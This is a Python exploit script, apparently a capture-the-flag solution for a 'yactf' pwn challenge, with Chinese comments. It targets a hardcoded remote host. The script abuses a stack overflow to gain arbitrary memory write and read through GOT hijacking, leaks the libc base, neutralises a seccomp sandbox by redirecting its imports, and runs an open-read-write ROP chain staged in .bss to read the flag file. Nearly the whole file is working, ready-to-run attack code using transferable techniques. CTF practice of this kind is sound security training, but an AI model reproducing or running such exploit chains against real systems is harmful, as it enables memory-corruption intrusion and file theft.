#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
yactf / pwn  exploit  (final v4)
================================
vuln: read(0, rbp-0x20, 0x30)  -> 只能覆盖 saved rbp + ret（16 字节）
seccomp: 只 kill execve / execveat -> 必须 ORW

原语
----
1) ret -> 0x40122b (lea rax,[rbp-0x20]; read(0,rax,0x30))，rbp 可控
   = 「任意地址写 0x30 字节」+ 之后 leave;ret 以 rbp 作栈 => 任意跳转
2) read@got <- 0x4010a0 (write@plt.sec)：read 调用点变成 write(0, rbp-0x20, 0x30)
   = 任意地址读，泄露 GOT（拿 libc）
3) seccomp GOT 劫持 + ret2main 复原 read@got：
   seccomp_init/rule_add/load@got <- 0x401070 (read 的 lazy stub)
   write@got <- 0x401050 (write 的 lazy stub，顺便自愈成真 write)
   read@got <- 0x404f00 (只作为 pivot 用的栈指针)
   ret2main -> main -> sandbox() -> "seccomp_init"(0x7fff0000)
     -> _dl_runtime_resolve 把 read@got 写回真 read；read(0x7fff0000,..) = EBADF 无害
   => 回到 vuln()，read 可用，且已知 libc
4) 用 libc 的 add rsp,0x18; ret 跳过每个窗口末尾的控制槽，
   把 ORW 链铺进 .bss，再迁移过去读 flag
"""
import socket, struct, sys, time, re

HOST = "1.14.76.59"
PORT = 30302

def p64(x): return struct.pack("<Q", x & 0xffffffffffffffff)
def u64(b): return struct.unpack("<Q", b.ljust(8, b"\0")[:8])[0]

READ_SITE  = 0x40122b
WRITE_PLT  = 0x4010a0
READ_STUB  = 0x401070
WRITE_STUB = 0x401050
RET_G      = 0x40101a
LEAVE_RET  = 0x40121d
MAIN       = 0x40125d

OFF_WRITE   = 0x1149c0
OFF_READ    = 0x114920
OFF_OPEN64  = 0x114630
OFF_POP_RDI = 0x2a3e5
OFF_POP_RSI = 0x2be51
OFF_POP_RDX = 0x90469    # pop rdx; pop rbx; ret
OFF_ADD_RSP = 0x3a889    # add rsp, 0x18; ret

CH   = 0x404800          # ORW 链
PATH = 0x404b00
BUF  = 0x404b80
S    = 0x404e00          # 泄露后的跳板链
STK  = 0x404f00          # ret2main 用的栈

DEBUG = True
def log(*a):
    if DEBUG: print(*a, flush=True)

class Conn:
    def __init__(self):
        last=None
        for _ in range(25):
            try:
                self.s=socket.create_connection((HOST,PORT),timeout=6); break
            except Exception as e:
                last=e; time.sleep(1.0)
        else: raise last
        self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    def rn(self, n, tm=3.0):
        self.s.settimeout(tm); o=b""
        while len(o)<n:
            try: d=self.s.recv(n-len(o))
            except socket.timeout: break
            if not d: break
            o+=d
        return o
    def drain(self, tm=1.0):
        self.s.settimeout(tm); o=b""
        while True:
            try: d=self.s.recv(4096)
            except Exception: break
            if not d: break
            o+=d
        return o
    def send(self,d): self.s.send(d)

def win6(c, qs):
    assert len(qs)==6, len(qs)
    c.send(b"".join(p64(x) for x in qs))

def ovf(c, dest):
    c.send(b"A"*0x20 + p64(dest+0x20) + p64(READ_SITE))

def run(flagpath=b"flag"):
    c = Conn()
    b0 = c.rn(0x13, 4)
    if len(b0) < 0x13:
        log("[!] no banner"); return None
    log("[*] banner:", b0)

    # ---- R0/R0a/R0b/R0c: 预置跳板控制块 ----
    ovf(c, 0x404040); c.rn(9)                         # [0x404040]=LEAVE_RET
    win6(c, [LEAVE_RET, 0, 0, 0, S+0x20, READ_SITE]); c.rn(9)
    win6(c, [0, MAIN, 0, 0, STK+0x20, READ_SITE]);    c.rn(9)   # S: [S+8]=MAIN
    win6(c, [0, MAIN, 0, 0, 0x404038, READ_SITE]);    c.rn(9)   # STK: [STK+8]=MAIN
    log("[*] jumpers ready")

    # ---- R1: seccomp 劫持 + ret2main 复原 read@got ----
    c.send(p64(READ_STUB)*2 + p64(WRITE_STUB) + p64(READ_STUB) + p64(STK))
    o1 = c.rn(9 + 0x13, 3)
    log("[*] heal: %r" % o1)
    if b"name" not in o1:
        log("[!] heal failed"); return None

    # ---- R2: 泄露 GOT ----
    ovf(c, 0x404038); c.rn(9)
    win6(c, [WRITE_PLT, S, LEAVE_RET, 0, 0x404040, READ_SITE])
    out = c.rn(9 + 0x30 + 9 + 0x13, 4)
    if len(out) < 9 + 0x30:
        log("[!] leak failed (%d)" % len(out)); return None
    lk = out[9:9+0x30]
    w = [u64(lk[i*8:i*8+8]) for i in range(6)]
    libc = w[1] - OFF_WRITE
    log("[*] write@libc=%#x  libc=%#x" % (w[1], libc))
    if (libc & 0xfff) or libc < 0x7f0000000000:
        log("[!] bad base"); return None
    time.sleep(0.2); c.drain(0.4)

    # ---- 铺 ORW 链 ----
    rdi, rsi, rdxb = libc+OFF_POP_RDI, libc+OFF_POP_RSI, libc+OFF_POP_RDX
    add = libc+OFF_ADD_RSP
    steps = [("pair",[rdi, PATH]),
             ("pair",[rsi, 0]),
             ("call",[libc+OFF_OPEN64]),
             ("pair",[rdi, 3]),
             ("pair",[rsi, BUF]),
             ("tri",[rdxb, 0x200, 0]),
             ("call",[libc+OFF_READ]),
             ("pair",[rdi, 1]),
             ("pair",[rsi, BUF]),
             ("call",[libc+OFF_WRITE])]
    dest = CH
    plan = []
    for kind, args in steps:
        if kind == "pair":
            q = args + [add, 0]; nxt = dest + 0x30
        elif kind == "call":
            q = args + [RET_G, add, 0]; nxt = dest + 0x30
        else:
            q = args + [add]; nxt = dest + 0x38
        plan.append((dest, q, nxt))
        dest = nxt
    log("[*] chain: %d steps, end=%#x" % (len(plan), dest))

    entry_dest = dest + 0x30
    for i,(d,q,nxt) in enumerate(plan):
        if i == len(plan)-1:
            nxt = PATH          # 最后一步的 pivot 指向 PATH，让下一轮写入路径字符串
        if i == 0:
            ovf(c, d); r=c.rn(9)
            if len(r)!=9: log("[!] W0 ovf ack %d"%len(r)); return None
        win6(c, q + [nxt+0x20, READ_SITE])
        r = c.rn(9)
        if len(r)!=9:
            log("[!] step %d ack %d" % (i, len(r))); return None
    log("[*] chain written")

    # ---- 路径字符串（真正写在 PATH 上）----
    ps = flagpath.ljust(0x20, b"\0")
    win6(c, [u64(ps[0:8]), u64(ps[8:16]), u64(ps[16:24]), u64(ps[24:32]),
             entry_dest+0x20, READ_SITE])
    if len(c.rn(9))!=9: log("[!] path ack fail")
    log("[*] path written @%#x" % PATH)

    # ---- 入口：控制槽 (CH-8, leave;ret) -> 进链 ----
    win6(c, [0,0,0,0, CH-8, LEAVE_RET])
    time.sleep(0.6)
    return c.drain(2.5)

if __name__ == "__main__":
    fp = sys.argv[1].encode() if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else b"flag"
    for attempt in range(6):
        try:
            res = run(fp)
        except Exception as e:
            log("[!] attempt %d: %r" % (attempt, e)); time.sleep(1.0); continue
        if not res:
            time.sleep(1.0); continue
        m = re.search(rb"[A-Z][A-Za-z0-9_]{2,}\{[^}\x00\n]{4,}\}", res)
        if m:
            print("[+] flag =", m.group().decode())
            break
        print("[-] no flag in output:", res[:200])
        time.sleep(1.0)
